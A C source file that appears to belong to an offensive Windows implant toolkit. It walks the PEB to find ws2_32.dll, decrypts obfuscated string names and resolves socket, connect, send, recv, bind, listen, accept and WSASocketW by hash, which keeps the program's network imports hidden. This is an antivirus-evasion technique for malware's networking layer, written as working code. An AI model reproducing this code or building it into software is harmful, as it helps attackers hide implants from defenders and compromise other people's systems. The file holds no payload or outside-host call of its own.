/*
 * ws2_peb.c — PEB-resolved Winsock API singleton
 *
 * Resolves all ws2_32.dll functions via PEB-walk.
 */
#include "ws2_peb.h"
#include "config.h"
#include "enc_strings.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"

static ws2_api_t g_ws2;

const ws2_api_t *mirage_ws2_api(void) {
    if (g_ws2.ready) return &g_ws2;

    char dll[32];
    enc_decrypt(enc_ws2_32, ENC_WS2_32_LEN, dll);
    void *mod = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!mod) return NULL;

    char fn[32];

    enc_decrypt(enc_WSAStartup, ENC_WSASTARTUP_LEN, fn);
    g_ws2.pStartup = (pWSAStartup)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_WSACleanup, ENC_WSACLEANUP_LEN, fn);
    g_ws2.pCleanup = (pWSACleanup)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_WSASocketW, ENC_WSASOCKETW_LEN, fn);
    g_ws2.pWSASocketW = (pWSASocketW)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_socket, ENC_SOCKET_LEN, fn);
    g_ws2.psocket = (psocket)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_connect, ENC_CONNECT_LEN, fn);
    g_ws2.pconnect = (pconnect)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_send, ENC_SEND_LEN, fn);
    g_ws2.psend = (psend)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_recv, ENC_RECV_LEN, fn);
    g_ws2.precv = (precv)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_closesocket, ENC_CLOSESOCKET_LEN, fn);
    g_ws2.pclosesocket = (pclosesocket)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_bind, ENC_BIND_LEN, fn);
    g_ws2.pbind = (pbind)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_listen, ENC_LISTEN_LEN, fn);
    g_ws2.plisten = (plisten)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_accept, ENC_ACCEPT_LEN, fn);
    g_ws2.paccept = (paccept)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_setsockopt, ENC_SETSOCKOPT_LEN, fn);
    g_ws2.psetsockopt = (psetsockopt)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_getsockname, ENC_GETSOCKNAME_LEN, fn);
    g_ws2.pgetsockname = (pgetsockname)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_getaddrinfo, ENC_GETADDRINFO_LEN, fn);
    g_ws2.pgetaddrinfo = (pgetaddrinfo)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_freeaddrinfo, ENC_FREEADDRINFO_LEN, fn);
    g_ws2.pfreeaddrinfo = (pfreeaddrinfo)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_htons, ENC_HTONS_LEN, fn);
    g_ws2.phtons = (phtons)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_htonl, ENC_HTONL_LEN, fn);
    g_ws2.phtonl = (phtonl)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_ntohs, ENC_NTOHS_LEN, fn);
    g_ws2.pntohs = (pntohs)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    if (!g_ws2.pStartup || !g_ws2.pCleanup || !g_ws2.pWSASocketW ||
        !g_ws2.psocket || !g_ws2.pconnect || !g_ws2.psend ||
        !g_ws2.precv || !g_ws2.pclosesocket || !g_ws2.pgetaddrinfo ||
        !g_ws2.pfreeaddrinfo || !g_ws2.phtons || !g_ws2.phtonl ||
        !g_ws2.pntohs)
        return NULL;

    g_ws2.ready = 1;
    return &g_ws2;
}

#ifdef ZIALFI_TEST_MODE
void mirage_ws2_api_install(const ws2_api_t *mock) {
    if (mock) {
        g_ws2 = *mock;
        g_ws2.ready = 1;
    }
}
#endif
